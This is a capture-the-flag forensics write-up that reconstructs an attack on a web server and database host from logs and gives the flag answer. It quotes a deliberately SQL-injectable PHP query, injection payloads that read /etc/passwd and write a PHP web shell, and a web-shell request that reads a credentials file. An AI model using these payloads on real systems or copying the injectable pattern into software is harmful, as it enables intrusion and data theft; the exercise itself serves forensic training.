# Demo — Writeup

- Category: Forensics
- Value: 100
- Author: @Alkimor1

## Challenge

> В ходе аудита безопасности были обнаружены подозрительные действия на веб-сервере компании. Предполагается, что злоумышленник смог проникнуть в сеть, переместиться на сервер базы данных и похитить конфиденциальную информацию.
>
> Укажите, с помощью какой уязвимости был получен первоначальный доступ и что он загрузил? От имени какого пользователя далее действовал злоумышленник? Что скопировал?
>
> Пример: `KubSTU{XSS,p0wny.php,Administrator,data.txt}`
>
> During a security audit, suspicious activity was detected on the company's web server. It is believed that an attacker was able to penetrate the network, move to the database server, and steal confidential information.
>
> Identify which vulnerability was used to gain initial access and what was uploaded. Under which user did the attacker subsequently operate? What was copied?
>
> Example: `KubSTU{XSS,p0wny.php,Administrator,data.txt}`

## Recon

The archive contains two hosts:

- `service/` with Apache logs and the web root
- `DB/` with SSH logs, MySQL config, and `dbadmin` history

`service/var/www/html/index.php` is directly vulnerable to SQL injection:

```php
$id = $_GET['id'];
$sql = "SELECT title, content FROM articles WHERE id = $id";
```

## Solve

`service/var/log/apache2/access.log` shows the attacker using `sqlmap` from `192.168.1.100`:

```text
GET /index.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd')
GET /index.php?id=1 UNION SELECT 1,@@datadir
GET /index.php?id=1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php'
```

That gives the first two flag fields:

- vulnerability: `SQLi`
- uploaded file: `shell.php`

The next request is:

```text
GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php
```

`config.php` contains the DB SSH settings:

```php
define('SSH_HOST', '192.168.1.50');
define('SSH_USER', 'dbadmin');
define('SSH_KEY', '/home/www-data/.ssh_key_key');
```

The stolen private key in `service/home/www-data/.ssh_key_key` matches
`DB/home/dbadmin/.ssh_authorized_keys`.

`DB/var/log/auth.log` confirms the lateral move:

```text
Accepted publickey for dbadmin from 192.168.1.10
```

So the attacker later operated as `dbadmin`.

Finally, `DB/home/dbadmin/.bash_history` shows what was copied:

```text
cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data
```

So the copied file was `confidential_data.sql`.

## Flag

```text
KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}
```

## Files

- [7_Demo.rar](files/7_Demo.rar)
- [solve.py](scripts/solve.py)
